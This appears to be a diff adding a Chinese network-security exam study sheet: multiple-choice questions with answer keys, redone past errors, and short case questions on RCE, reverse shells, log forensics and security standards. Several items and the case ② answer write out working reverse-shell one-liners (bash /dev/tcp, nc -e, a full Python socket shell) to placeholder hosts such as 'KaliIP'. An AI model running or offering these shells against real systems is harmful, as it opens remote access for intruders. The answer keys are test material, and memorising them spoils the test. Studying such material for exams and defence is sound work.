@@ -1,0 +1,202 @@
+```
+1. 【2024改编】RCE（远程命令执行）与文件上传漏洞的最大区别是（  ）
+   A. RCE只能执行系统命令，文件上传能获取WebShell
+   B. RCE在服务器上执行命令，文件上传需要先上传后执行
+   C. 两者没有区别
+   D. 文件上传危害更大
+
+2. 【2024改编】Linux中bash反弹Shell的标准语句是（  ）
+   A. bash -c "nc -e /bin/sh IP PORT"
+   B. bash -i >& /dev/tcp/IP/PORT 0>&1
+   C. bash -c "ping IP"
+   D. bash -r IP PORT
+
+3. 【2024改编】nc -e /bin/sh IP PORT 这条命令的含义是（  ）
+   A. 连接IP的PORT端口，把/bin/sh绑定到该连接上
+   B. 监听本机的PORT端口，等待连接
+   C. 测试IP的PORT端口是否开放
+   D. 从IP的PORT端口下载文件
+
+4. 【2024改编】以下哪种反弹Shell方式不需要目标机器安装额外工具？（  ）
+   A. nc反弹  B. bash /dev/tcp反弹  C. Python反弹  D. Perl反弹
+
+5. 【2024改编】防御命令注入（RCE）最有效的方法是（  ）
+   A. 过滤输入中的特殊字符 | ; & $(反引号)
+   B. 使用HTTPS
+   C. 关闭服务器
+   D. 使用WAF就够
+
+6. 【2023改编】以下哪个命令可以查看Linux系统开放的端口监听？（  ）
+   A. ps aux  B. netstat -anp | grep LISTEN  C. df -h  D. who
+
+7. 【2024改编】Linux中 /etc/passwd 每一行第二个字段是x表示（  ）
+   A. 密码为空  B. 密码存储在/etc/shadow中  C. 账户已禁用  D. 密码过期
+
+8. 【2024改编】以下哪组是Windows登录成功/失败/注销的事件ID？（  ）
+   A. 4624/4625/4634  B. 4625/4624/4720  C. 4720/4625/4634  D. 4624/4634/4625
+
+9. 【2024改编】Linux进程排查中，ls -la /proc/PID/exe 的作用是（  ）
+   A. 查看进程的内存使用  B. 查看进程的可执行文件路径
+   C. 查看进程的父进程  D. 查看进程的PID
+
+10. 【2023改编】以下哪个是数字信封的正确流程？（  ）
+    A. 发送方用接收方公钥加密会话密钥 → 接收方用自己的私钥解密
+    B. 发送方用自己私钥加密 → 接收方用发送方公钥解密
+    C. 发送方用接收方私钥加密 → 接收方用接收方公钥解密
+    D. 双方用同一密钥加解密
+
+11. 【2024改编】SSH默认端口和被入侵时重点检查的日志文件分别是（  ）
+    A. 22 /var/log/auth.log  B. 22 /var/log/syslog
+    C. 80 /var/log/apache2/access.log  D. 443 /var/log/auth.log
+
+12. 【2024改编】以下哪种方式不能用来检测RCE攻击？（  ）
+    A. 检查Web日志中的cmd、exec等关键字
+    B. 检查异常进程（如nc、python -c）
+    C. 检查磁盘空间使用率
+    D. 检查网络外连（ESTABLISHED）
+
+13. 【2024改编】等保2.0"一个中心、三重防护"中的"一个中心"是指（  ）
+    A. 安全管理中心  B. 计算环境中心  C. 网络中心  D. 数据中心
+
+14. 【2024改编】以下哪个不是iptables的默认表？（  ）
+    A. filter  B. nat  C. route  D. mangle
+
+15. 【2024改编】Linux中查看最近用户登录记录的命令是（  ）
+    A. whoami  B. last  C. id  D. pwd
+
+16. 【2024改编】RCE漏洞的成因是（  ）
+    A. 参数未过滤直接传入系统命令执行函数
+    B. 文件上传时未校验文件类型
+    C. SQL语句拼接用户输入
+    D. XML解析器配置不当
+
+17. 【2024改编】攻击者通过RCE获取Shell后，第一步通常会做什么？（  ）
+    A. 删除系统日志  B. 查看当前用户权限(id)
+    C. 重启服务器  D. 格式化磁盘
+
+18. 【2024改编】以下命令中，哪个可以在nc反弹失败时作为替代方案？（  ）
+    A. telnet IP PORT  B. python -c 'import pty;pty.spawn("/bin/sh")'
+    C. wget http://IP/shell  D. curl -O http://IP/shell.sh
+
+19. 【2024改编】blaster蠕虫利用的漏洞是（  ）
+    A. MS03-026（RPC DCOM漏洞）  B. MS17-010（永恒之蓝）
+    C. MS08-067  D. MS12-020
+
+20. 【2024改编】以下哪个TCP状态表示"正在主动发起连接"？（  ）
+    A. ESTABLISHED  B. SYN_SENT  C. TIME_WAIT  D. CLOSE_WAIT
+
+21. 【2024改编】应用代理防火墙的安全控制更灵活，但缺点是什么？（  ）
+    A. 速度慢  B. 对用户不透明  C. 部署复杂  D. 以上都是
+
+22. 【2024改编】Syslog日志的四个字段是（  ）
+    A. 时间+主机名+用户名+消息  B. 时间+主机名+子系统+消息
+    C. 时间+用户名+子系统+消息  D. 主机名+用户名+子系统+消息
+
+23. 【2024改编】Linux使用 kill -9 PID 和 kill PID 的区别是（  ）
+    A. kill -9 强制终止，kill 请求终止  B. 没有区别
+    C. kill -9 暂停进程  D. kill 强制终止
+
+24. 【2024改编】渗透测试中，黑盒测试是指（  ）
+    A. 完全不提供被测系统的信息  B. 提供部分信息
+    C. 提供全部信息  D. 自动扫描
+
+25. 【2024改编】以下哪个不是常见的反弹Shell类型？（  ）
+    A. bash反弹  B. nc反弹  C. HTTP反弹  D. Python反弹
+
+26. 【2024改编】whoami 和 whoami /priv 在Windows上的区别是（  ）
+    A. whoami看用户名，whoami /priv看当前用户权限
+    B. 两者一样
+    C. whoami看IP地址
+    D. whoami /priv看登录时间
+
+27. 【2024改编】以下哪种行为属于"入侵痕迹清理"？（  ）
+    A. 删除 /var/log/auth.log  B. 添加新用户
+    C. 安装杀毒软件  D. 修改防火墙规则
+
+28. 【2024改编】如果发现服务器对外大量发包，应该先做什么？（  ）
+    A. 关机  B. 重装系统  C. 先排查异常进程和网络连接  D. 断开网线
+
+29. 【2024改编】GB17859中系统恢复机制在哪一级？（  ）
+    A. 第3级安全标记保护级  B. 第4级结构化保护级
+    C. 第5级访问验证保护级  D. 第2级系统审计保护级
+
+30. 【2024改编】数字签名的核心作用是什么？（  ）
+    A. 保密性+可用性  B. 完整性+不可否认性
+    C. 完整性+可用性  D. 保密性+完整性
+
+答案：
+ 1-B  2-B  3-A  4-B  5-A  6-B  7-B  8-A  9-B 10-A
+11-A 12-C 13-A 14-C 15-B 16-A 17-B 18-B 19-A 20-B
+21-D 22-B 23-A 24-A 25-C 26-A 27-A 28-C 29-C 30-B
+```
+
+---
+
+### 🔴 Part 2：错题库5道错题重做（15min）
+
+从2023+2024错题库中抽取：
+
+```
+1. 【2023错题】以下恶意代码中属于宏病毒的是（  ）
+   A. Worm.Blaster.g  B. Macro.Melissa  C. Backdoor.Agobot.frt  D. Trojan.huigezi.a
+
+2. 【2023错题】GB17859中提供系统恢复机制的是（  ）
+   A. 结构化保护级  B. 安全标记保护级  C. 访问验证保护级  D. 系统审计保护级
+
+3. 【2024错题】能接收所有类型数据帧的网卡状态是（  ）
+   A. unicast  B. multicast  C. broadcast  D. promiscuous
+
+4. 【2024错题】以下属于自主访问控制模型的是（  ）
+   A. HRU模型  B. BN模型  C. BLP模型  D. Biba模型
+
+5. 【2023错题】Apache中负责文件读取控制的是（  ）
+   A. httpd.conf  B. access.conf  C. srm.conf  D. php.ini
+
+答案+解析：
+1. B → Melissa=宏病毒（通过Word传播）。Blaster=蠕虫，Agobot=后门，huigezi=木马
+2. C → 第5级访问验证保护级提供系统恢复机制。4级结构化保护级不提供
+3. D → promiscuous混杂模式=接收所有帧。unicast=单播，multicast=组播，broadcast=广播
+4. A → HRU=自主访问控制模型（Harrison-Ruzzo-Ullman）。BLP/Biba是强制访问控制
+5. B → access.conf 负责文件读取控制。httpd.conf=主配置，srm.conf=资源映射
+```
+
+---
+
+### 🟡 Part 3：案例分析小问——每天3道（30min）
+
+```
+案例① RCE检测思路
+  某Web服务器疑似被RCE攻击，但你敲了ps aux没看到异常进程。
+  你应该检查哪里才能确认攻击者是否成功执行了命令？
+
+案例② 反弹Shell选择
+  你拿到一个RCE漏洞，但目标机器上没有安装nc。
+  你应该用什么方式来反弹Shell？
+
+案例③ 网络外联判断
+  netstat -anp | grep ESTABLISHED 只显示了你自己SSH的连接，
+  没有其他外联。这是好事还是坏事？说明什么？
+
+（先自己写，再对照）
+
+案例①答案：
+  检查Web日志（access.log）中的请求参数：
+  grep -E "cmd|exec|system|passthru|whoami" /var/log/apache2/access.log
+  如果URL里含有 ;id、|whoami、`命令` 等特征，说明攻击者在尝试RCE。
+  ps aux没看到异常可能的原因：攻击者执行的是"一次性的命令"（比如whoami），
+  执行完就结束了，不会留常驻进程。反弹Shell才会留进程。
+
+案例②答案：
+  使用 bash /dev/tcp 反弹（不需要nc）：
+  bash -i >& /dev/tcp/KaliIP/PORT 0>&1
+  或使用 Python 反弹（如果目标有Python）：
+  python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KaliIP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+
+案例③答案：
+  如果没有其他外联 → 好事。说明没有木马C2外连。
+  但也要注意：有些木马用HTTPS 443外联，或者用DNS隧道外联，
+  netstat可能看不到（DNS走UDP，netstat加-t看TCP看不到UDP）。
+  所以"没有外联"不能100%确定安全，但至少没有明显的TCP外联。
+```
+
+---
